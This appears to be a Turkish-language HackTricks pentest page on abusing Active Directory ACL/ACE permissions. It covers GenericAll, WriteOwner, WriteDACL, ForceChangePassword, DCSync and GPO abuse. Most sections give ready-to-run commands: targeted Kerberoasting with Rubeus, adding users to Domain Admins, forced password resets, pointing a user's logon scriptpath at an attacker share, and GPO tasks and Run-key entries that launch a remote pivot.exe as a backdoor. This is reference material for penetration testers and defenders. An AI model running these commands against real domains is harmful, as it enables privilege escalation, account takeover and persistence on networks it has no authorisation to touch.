# Active Directory ACLs/ACEs'nin Kötüye Kullanımı

{{#include ../../../banners/hacktricks-training.md}}

**Bu sayfa büyük ölçüde şu tekniklerin özetidir** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **ve** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Daha fazla detay için orijinal makalelere bakın.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Kullanıcı Üzerinde GenericAll Hakları**

Bu ayrıcalık, saldırganın hedef kullanıcı hesabı üzerinde tam kontrol sahibi olmasını sağlar. `Get-ObjectAcl` komutu kullanılarak `GenericAll` hakları doğrulandıktan sonra, saldırgan şunları yapabilir:

- **Hedefin Parolasını Değiştirme**: `net user <username> <password> /domain` komutunu kullanarak, saldırgan kullanıcının parolasını sıfırlayabilir.
- **Targeted Kerberoasting**: Kullanıcının hesabına bir SPN atayarak hesabı kerberoastable hale getirin, sonra Rubeus ve targetedKerberoast.py kullanarak ticket-granting ticket (TGT) hash'lerini elde edip kırmayı deneyin.
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Kullanıcı için pre-authentication'i devre dışı bırakarak hesabını ASREPRoasting'e karşı savunmasız hale getirin.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **Grup Üzerinde GenericAll Hakları**

Bu ayrıcalık, bir saldırganın `GenericAll` haklarına sahip olduğu, `Domain Admins` gibi bir grup üzerinde grup üyeliklerini değiştirmesine izin verir. `Get-NetGroup` ile grubun distinguished name'ini belirledikten sonra saldırgan şunları yapabilir:

- **Kendilerini Domain Admins grubuna ekleme**: Bu, doğrudan komutlarla veya Active Directory veya PowerSploit gibi modüller kullanılarak yapılabilir.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
Linux'tan BloodyAD'yi kullanarak, üzerlerinde GenericAll/Write üyeliğiniz varsa kendinizi herhangi bir gruba ekleyebilirsiniz. Hedef grup "Remote Management Users" içine iç içe geçmişse, o grubu dikkate alan hostlarda hemen WinRM erişimi elde edersiniz:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Bu ayrıcalıklara bir bilgisayar nesnesi veya kullanıcı hesabı üzerinde sahip olmak şunlara izin verir:

- **Kerberos Resource-based Constrained Delegation**: Bir bilgisayar nesnesinin ele geçirilmesini sağlar.
- **Shadow Credentials**: Bu tekniği, ayrıcalıkları kullanarak shadow credentials oluşturarak bir bilgisayarı veya kullanıcı hesabını taklit etmek için kullanın.

## **WriteProperty on Group**

Bir kullanıcı belirli bir grup için (ör. `Domain Admins`) tüm nesneler üzerinde `WriteProperty` haklarına sahipse, şunları yapabilir:

- **Kendilerini Domain Admins Grubuna Ekleme**: `net user` ve `Add-NetGroupUser` komutlarının kombinasyonu ile gerçekleştirilebilir; bu yöntem domain içinde privilege escalation sağlar.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Bu hak, saldırganların grup üyeliğini doğrudan değiştiren komutlarla kendilerini `Domain Admins` gibi belirli gruplara eklemelerine olanak sağlar. Aşağıdaki komut dizisiyle kendinizi ekleyebilirsiniz:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Benzer bir ayrıcalık olan bu, saldırganların ilgili gruplarda `WriteProperty` hakkına sahip olmaları halinde grup özelliklerini değiştirerek kendilerini doğrudan gruplara eklemelerine olanak sağlar. Bu ayrıcalığın doğrulanması ve yürütülmesi şununla gerçekleştirilir:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

`User-Force-Change-Password` için bir kullanıcı üzerinde `ExtendedRight`'a sahip olmak, mevcut parolayı bilmeden parola sıfırlamalarına izin verir. Bu hakkın doğrulanması ve istismarı PowerShell veya alternatif komut satırı araçlarıyla yapılabilir; bir kullanıcının parolasını sıfırlamak için etkileşimli oturumlar ve etkileşimsiz ortamlar için tek satırlık komutlar da dahil olmak üzere çeşitli yöntemler sunar. Komutlar basit PowerShell çağrılarından Linux üzerinde `rpcclient` kullanımına kadar uzanır ve bu da saldırı vektörlerinin çok yönlülüğünü gösterir.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner'ın Grup Üzerinde Kullanımı**

Eğer bir saldırganın bir grup üzerinde `WriteOwner` hakkı varsa, grubun sahipliğini kendisine atayabilir. Bu, söz konusu grup `Domain Admins` ise özellikle etkilidir; sahiplik değişikliği grup öznitelikleri ve üyelik üzerinde daha geniş kontrol sağlar. İşlem, doğru nesnenin `Get-ObjectAcl` ile belirlenmesini ve ardından sahibi `Set-DomainObjectOwner` ile SID veya isim kullanarak değiştirmeyi içerir.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Bu izin bir saldırganın kullanıcı özelliklerini değiştirmesine olanak tanır. Özellikle `GenericWrite` erişimiyle saldırgan, kullanıcı oturum açtığında kötü amaçlı bir betiği çalıştırmak için bir kullanıcının oturum açma betiği yolunu değiştirebilir. Bu, hedef kullanıcının `scriptpath` özelliğini saldırganın betiğine işaret edecek şekilde güncellemek için `Set-ADObject` komutunun kullanılmasıyla gerçekleştirilir.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Bu ayrıcalık sayesinde saldırganlar grup üyeliğini manipüle edebilir; örneğin kendilerini veya diğer kullanıcıları belirli gruplara ekleyebilirler. Bu süreç bir kimlik bilgisi nesnesi (credential object) oluşturmayı, bunu kullanarak kullanıcıları bir gruba eklemeyi veya gruptan kaldırmayı ve PowerShell komutlarıyla üyelik değişikliklerini doğrulamayı içerir.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Bir AD nesnesine sahip olmak ve üzerinde `WriteDACL` ayrıcalıklarına sahip olmak, saldırganın kendine nesne üzerinde `GenericAll` ayrıcalıkları vermesini sağlar. Bu, ADSI manipülasyonu aracılığıyla gerçekleştirilir; nesne üzerinde tam kontrol ve grup üyeliklerini değiştirme yeteneği sağlar. Buna rağmen, Active Directory modülünün `Set-Acl` / `Get-Acl` cmdlets'lerini kullanarak bu ayrıcalıkları istismar etmeye çalışırken sınırlamalar vardır.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Etki Alanında Replikasyon (DCSync)**

DCSync saldırısı, etki alanındaki belirli replikasyon izinlerini kullanarak bir Domain Controller'ı taklit eder ve kullanıcı kimlik bilgileri de dahil olmak üzere verileri senkronize eder. Bu güçlü teknik `DS-Replication-Get-Changes` gibi izinler gerektirir; bu sayede saldırganlar bir Domain Controller'a doğrudan erişim olmadan AD ortamından hassas bilgileri çıkarabilir. [**Learn more about the DCSync attack here.**](../dcsync.md)

## GPO Yetkilendirmesi <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO Yetkilendirmesi

GPO'ları (Group Policy Objects) yönetmek için devredilen erişim ciddi güvenlik riskleri oluşturabilir. Örneğin, `offense\spotless` gibi bir kullanıcıya GPO yönetim hakları devredilmişse, **WriteProperty**, **WriteDacl** ve **WriteOwner** gibi ayrıcalıklara sahip olabilir. Bu izinler kötü amaçla kullanılabilir; PowerView ile tespit örneği: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### GPO İzinlerini Belirleme

Yanlış yapılandırılmış GPO'ları belirlemek için PowerSploit cmdlet'leri zincirlenebilir. Bu, belirli bir kullanıcının yönetme iznine sahip olduğu GPO'ları keşfetmeyi sağlar: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Belirli Bir Politikanın Uygulandığı Bilgisayarlar**: Belirli bir GPO'nun hangi bilgisayarlara uygulandığını çözümlemek mümkündür; bu, potansiyel etkinin kapsamını anlamaya yardımcı olur. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Belirli Bir Bilgisayara Uygulanan Politikalar**: Belirli bir bilgisayara hangi politikaların uygulandığını görmek için `Get-DomainGPO` gibi komutlar kullanılabilir.

**Belirli Bir Politikayla Etkilenen OU'lar**: Belirli bir politikadan etkilenen organizational unit'leri (OU'lar) belirlemek için `Get-DomainOU` kullanılabilir.

GPO'ları sıralamak ve içlerindeki sorunları bulmak için [**GPOHound**](https://github.com/cogiceo/GPOHound) aracını da kullanabilirsiniz.

### Abuse GPO - New-GPOImmediateTask

Yanlış yapılandırılmış GPO'lar, örneğin anında çalışan bir scheduled task oluşturarak kod yürütmek için sömürülebilir. Bu, etkilenen makinelerde bir kullanıcıyı yerel yöneticiler grubuna eklemek için yapılabilir ve ayrıcalıkları önemli ölçüde yükseltir:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

GroupPolicy module, kuruluysa, yeni GPOs oluşturmaya ve bağlamaya, ayrıca etkilenen bilgisayarlarda backdoors çalıştırmak için registry values gibi tercihleri ayarlamaya izin verir. Bu yöntem, yürütme için GPO'nun güncellenmesini ve bir kullanıcının bilgisayara oturum açmasını gerektirir:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse, yeni GPO'lar oluşturmaya gerek kalmadan mevcut GPO'ları görevler ekleyerek veya ayarları değiştirerek suistimal etme yöntemi sunar. Bu araç, değişiklikleri uygulamadan önce mevcut GPO'ların değiştirilmesini veya yeni GPO'lar oluşturmak için RSAT araçlarının kullanılmasını gerektirir:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Force Policy Update

GPO güncellemeleri genellikle yaklaşık her 90 dakikada bir gerçekleşir. Bu süreci, özellikle bir değişiklik uygulandıktan sonra hızlandırmak için hedef bilgisayarda `gpupdate /force` komutu kullanılarak anında bir politika güncellemesi zorlanabilir. Bu komut, GPO'larda yapılan herhangi bir değişikliğin bir sonraki otomatik güncelleme döngüsünü beklemeden uygulanmasını sağlar.

### Under the Hood

Belirli bir GPO için Scheduled Tasks incelendiğinde, örneğin `Misconfigured Policy`, `evilTask` gibi görevlerin eklendiği doğrulanabilir. Bu görevler, sistem davranışını değiştirmeyi veya ayrıcalıkları yükseltmeyi amaçlayan scriptler veya komut satırı araçlarıyla oluşturulur.

Görevin yapısı, `New-GPOImmediateTask` tarafından oluşturulan XML yapılandırma dosyasında gösterildiği gibi, yürütülecek komut ve tetikleyiciler dahil olmak üzere zamanlanmış görevin ayrıntılarını özetler. Bu dosya, GPO'lar içinde zamanlanmış görevlerin nasıl tanımlandığını ve yönetildiğini gösterir; politika uygulamasının bir parçası olarak rastgele komutların veya scriptlerin çalıştırılması için bir yöntem sağlar.

### Users and Groups

GPO'lar ayrıca hedef sistemlerde kullanıcı ve grup üyeliklerinin değiştirilmesine de izin verir. Users and Groups politika dosyalarını doğrudan düzenleyerek, saldırganlar yerel `administrators` gibi ayrıcalıklı gruplara kullanıcı ekleyebilir. Bu, GPO yönetim izinlerinin delegasyonu yoluyla mümkündür; bu da politika dosyalarının yeni kullanıcılar ekleyecek veya grup üyeliklerini değiştirecek şekilde değiştirilmesine izin verir.

Users and Groups için XML yapılandırma dosyası bu değişikliklerin nasıl uygulandığını ortaya koyar. Bu dosyaya girişler ekleyerek, belirli kullanıcılara etkilenen sistemler genelinde yükseltilmiş ayrıcalıklar verilebilir. Bu yöntem, GPO manipülasyonu yoluyla ayrıcalık yükseltmeye doğrudan bir yaklaşım sunar.

Dahası, kod çalıştırma veya kalıcılığı sürdürme için logon/logoff scripts kullanmak, autoruns için registry anahtarlarını değiştirmek, .msi dosyalarıyla yazılım yüklemek veya servis yapılandırmalarını düzenlemek gibi ek yöntemler de değerlendirilebilir. Bu teknikler, GPO'ların kötüye kullanılması yoluyla erişimi sürdürmek ve hedef sistemleri kontrol etmek için çeşitli yollar sağlar.

## References

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
